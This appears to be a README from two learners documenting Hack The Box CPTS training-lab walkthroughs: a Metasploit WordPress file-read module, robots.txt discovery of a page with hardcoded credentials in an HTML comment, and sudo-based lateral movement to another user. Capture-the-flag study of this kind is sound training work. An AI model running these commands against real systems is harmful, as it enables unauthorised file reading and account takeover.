# 🏴 Hack The Box — CPTS Certification Journey

Two hackers working toward the **Hack The Box Certified Penetration Testing Specialist (CPTS)** certification. This repo documents our progress, methodology, and flags along the way.

## Table of Contents

- [Section 8 — Service Scanning](#-section-8--service-scanning)
- [Section 9 — Web Enumeration](#-section-9--web-enumeration)
- [Section 11 — Privilege Escalation](#-section-11--privilege-escalation)

---

## 📦 Section 8 — Service Scanning

> **Objective:** Identify services running on the target, find public exploits, and retrieve `/flag.txt`.

### Reconnaissance

**Target:** `http://154.57.164.72:31179/`

Navigating to the target reveals an information disclosure — one of my most favorite (and common) pentest findings:

![Service Scanning - Information Disclosure](images/section8box.png)

The exposed version info points us toward a known WordPress vulnerability. Using AI-assisted research, I identify the relevant Metasploit module:

```
auxiliary/scanner/http/wp_simple_backup_file_read
```

### Exploitation via Metasploit

```bash
msf > use auxiliary/scanner/http/wp_simple_backup_file_read
msf > set RHOSTS 154.57.164.72
msf > set RPORT 31179
msf > set FILEPATH /flag.txt
msf > run

[+] File saved in: /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt

HTB{REDACTED}
```

✅ **Flag captured.**

---

## 🌐 Section 9 — Web Enumeration

> **Objective:** Identify services, find public exploits, and retrieve `/flag.txt`.

This section covers finding public exploits via Google dorking (`<technology> + exploit`), Searchsploit, and Metasploit.

### Nmap Scan

```bash
nmap -sV -p 30764 154.57.164.63
```

```
PORT      STATE SERVICE VERSION
30764/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Web Server Exploration

Visiting the target shows a simple landing page:

![Web Enumeration - Landing Page](images/Section9.png)

The page source is a basic HTML page with no interesting content — just a styled "Welcome to HTB Academy Blog" heading.

### Discovering Hidden Pages

Checking `robots.txt` at `http://154.57.164.63:30764/robots.txt`:

```
User-agent: *
Disallow: /admin-login-page.php
```

You disallow robots, but not humans — let's check it out.

![Admin Login Page](images/2.png)

### Source Code Analysis

Inspecting the login page source reveals hardcoded credentials in an HTML comment:

```html
<!-- TODO: remove test credentials admin:password123 -->
```

✅ **Flag:** `HTB{REDACTED}`

---

## 🔐 Section 11 — Privilege Escalation

> **Objective:** SSH into the server, pivot to `user2`, and retrieve `/home/user2/flag.txt`.

### Reconnaissance

```bash
nmap -sV -Pn 154.57.164.64
```

```
PORT   STATE SERVICE VERSION
53/tcp open  domain?
```

### Initial Access

SSH in as `user1` on the provided port:

```bash
ssh -p 30798 user1@154.57.164.64
```

### Privilege Enumeration

Checking what `user1` can run with elevated privileges:

```bash
user1@host:~$ sudo -l
```

```
User user1 may run the following commands:
    (user2 : user2) NOPASSWD: /bin/bash
```

`user1` can run `/bin/bash` as `user2` without a password — easy lateral move.

### Lateral Movement

```bash
user1@host:~$ sudo -u user2 /bin/bash
user2@host:~$ cat /home/user2/flag.txt
HTB{REDACTED}
```

✅ **Flag captured.**


